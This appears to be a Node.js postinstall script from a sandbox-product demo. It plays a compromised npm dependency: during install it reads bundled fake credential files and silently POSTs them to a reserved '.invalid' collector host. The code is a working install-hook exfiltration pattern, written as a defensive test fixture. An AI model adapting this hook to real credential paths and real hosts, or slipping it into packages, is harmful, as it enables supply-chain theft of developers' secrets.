'use strict';

/**
 * postinstall.js — part of the "left-padder" sandbox demo fixture.
 *
 * PURPOSE
 * -------
 * This script deliberately makes an outbound HTTPS request during `npm install`
 * so that a sandboxing / egress-blocking product has an obvious, observable event
 * to contain and report. It is the "compromised dependency" stand-in for the demo.
 *
 * WHY IT IS SAFE TO SHIP
 * ----------------------
 *  - It reads ONLY the fake canary files bundled in ./fixtures. It never touches
 *    the real ~/.npmrc, ~/.aws/credentials, environment variables, or any other
 *    file outside this package directory.
 *  - The destination host is "collector.airlock-demo.invalid", which uses the
 *    RFC 2606 reserved ".invalid" TLD. It can never resolve or route anywhere,
 *    so no data can actually leave the machine.
 *  - It uses Node built-ins only: no shell commands, no child processes,
 *    no dependencies, no filesystem writes.
 *  - Every failure path is swallowed, so `npm install` always succeeds.
 *
 * The canary payload is intentionally recognizable as fake (AKIAA11LOCKDEMO...)
 * so that anyone reading logs or a report can immediately tell it is a drill.
 */

const https = require('https');
const fs = require('fs');
const path = require('path');

const ENDPOINT_HOST = 'collector.airlock-demo.invalid';
const ENDPOINT_PATH = '/upload';
const TIMEOUT_MS = 5000;

/** Files inside this package that act as fake "stolen" credentials. */
const CANARY_FILES = [
  'fixtures/fake-npmrc.txt',
  'fixtures/fake-aws-credentials.txt',
];

function readCanaryFiles() {
  const collected = {};
  for (const rel of CANARY_FILES) {
    try {
      const abs = path.join(__dirname, rel);
      collected[rel] = fs.readFileSync(abs, 'utf8');
    } catch (err) {
      // Missing or unreadable canary file: nothing to report for it.
      collected[rel] = null;
    }
  }
  return collected;
}

function uploadCanaries() {
  return new Promise((resolve) => {
    let body;
    try {
      body = JSON.stringify({
        marker: 'airlock-demo-fixture',
        package: 'left-padder@1.4.3',
        collectedAt: new Date().toISOString(),
        files: readCanaryFiles(),
      });
    } catch (err) {
      // Serialisation failed; nothing sensible left to send.
      return resolve();
    }

    const req = https.request(
      {
        hostname: ENDPOINT_HOST,
        port: 443,
        path: ENDPOINT_PATH,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body),
        },
        timeout: TIMEOUT_MS,
      },
      (res) => {
        // Drain the response so the socket can close cleanly.
        res.resume();
        res.on('end', () => resolve());
      }
    );

    // Never let a failure propagate to npm.
    req.on('timeout', () => req.destroy());
    req.on('error', () => resolve());

    try {
      req.end(body);
    } catch (err) {
      resolve();
    }
  });
}

// Run, but never throw and never exit non-zero.
uploadCanaries()
  .catch(() => {})
  .then(() => {
    // Intentionally silent on success and on failure.
  });
